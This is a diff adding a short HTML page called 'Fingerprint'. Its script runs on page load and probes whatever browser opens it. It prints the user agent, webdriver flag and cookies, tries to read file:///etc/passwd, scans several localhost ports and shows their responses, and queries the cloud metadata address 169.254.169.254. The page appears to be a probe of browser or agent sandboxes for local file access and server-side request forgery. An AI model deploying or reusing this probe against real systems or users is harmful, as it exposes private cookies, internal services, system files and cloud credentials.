@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Fingerprint</h1>
+<pre id="out"></pre>
+
+<script>
+async function run() {
+  let out = document.getElementById("out");
+
+  function log(x) {
+    out.textContent += x + "\n";
+  }
+
+  // Info básica
+  log("=== NAVIGATOR ===");
+  log("UA: " + navigator.userAgent);
+  log("Platform: " + navigator.platform);
+  log("Language: " + navigator.language);
+  log("Webdriver: " + navigator.webdriver);
+  log("CPU cores: " + navigator.hardwareConcurrency);
+
+  // Cookies
+  log("\n=== COOKIES ===");
+  log(document.cookie || "No cookies");
+
+  // Plugins
+  log("\n=== PLUGINS ===");
+  log("Count: " + navigator.plugins.length);
+
+  // Intento de acceso a archivos locales
+  log("\n=== FILE TEST ===");
+  try {
+    let r = await fetch("file:///etc/passwd");
+    let t = await r.text();
+    log("file:///etc/passwd:\n" + t.slice(0,200));
+  } catch(e) {
+    log("No access to file://");
+  }
+
+  // Scan localhost
+  log("\n=== LOCALHOST SCAN ===");
+  let ports = [80, 3000, 5000, 8000, 8080];
+
+  for (let p of ports) {
+    try {
+      let r = await fetch("http://127.0.0.1:" + p);
+      let t = await r.text();
+      log("Port " + p + " OPEN");
+      log(t.slice(0,200));
+    } catch(e) {
+      log("Port " + p + " closed");
+    }
+  }
+
+  // Metadata cloud
+  log("\n=== METADATA ===");
+  try {
+    let r = await fetch("http://169.254.169.254/latest/meta-data/");
+    let t = await r.text();
+    log(t);
+  } catch(e) {
+    log("No metadata access");
+  }
+}
+
+run();
+</script>
+</body>
+</html>
